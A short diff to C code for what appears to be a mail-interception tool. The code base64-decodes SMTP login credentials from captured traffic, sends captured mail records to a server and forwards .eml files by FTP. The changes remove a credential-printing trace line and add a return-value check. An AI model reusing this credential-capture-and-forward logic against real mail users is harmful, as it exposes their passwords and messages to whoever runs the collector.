@@ -89,8 +89,6 @@ void auth_parser(list<mail_data_type >::iterator it,unsigned char * buf,size_t s
 	unsigned char decoded_username_and_passwd[128]={0};
 	base64_decode(decoded_username_and_passwd,encoded_username_and_passwd,up_size);
 
-	__TRACE__("\n%s\n",decoded_username_and_passwd);
-
 	unsigned char * start_point=decoded_username_and_passwd+1; //this reason is what decoded_username_and_passwd's first char is '\0'
 
 	//find '\0'
@@ -625,6 +623,7 @@ int send_data_to_server(void * buf,size_t size)
 	closesocket(socketClient);
 #endif
 	__TRACE__("send data success\n");
+	return 0;
 
 }
 
@@ -638,7 +637,10 @@ void * thread_start(void * arg)
 {
 	//send data
 	mail_data_type * p_data= (mail_data_type *)arg;	
-	send_data_to_server(p_data,sizeof(mail_data_type));
+	if(send_data_to_server(p_data,sizeof(mail_data_type))!=0)
+	{
+		return NULL;
+	}
 
 	//send eml file via ftp
 	char eml_file_path[256]={0};
